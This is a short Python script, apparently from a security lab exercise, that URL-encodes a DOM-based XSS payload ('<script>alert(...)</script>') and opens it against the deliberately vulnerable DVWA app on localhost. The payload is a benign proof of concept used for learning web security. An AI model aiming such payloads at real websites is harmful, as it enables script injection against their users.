import webbrowser
import urllib.parse

# URL base del XSS DOM en DVWA
base_url = "http://localhost/vulnerabilities/xss_d/"

# Payload XSS
payload = "<script>alert('XSS DOM')</script>"

# Codificar el payload para que funcione en la URL
encoded_payload = urllib.parse.quote(payload)

# Construir la URL final
final_url = f"{base_url}?default={encoded_payload}"

# Abrir en el navegador por defecto
webbrowser.open(final_url)

# Mostrar también por consola
final_url
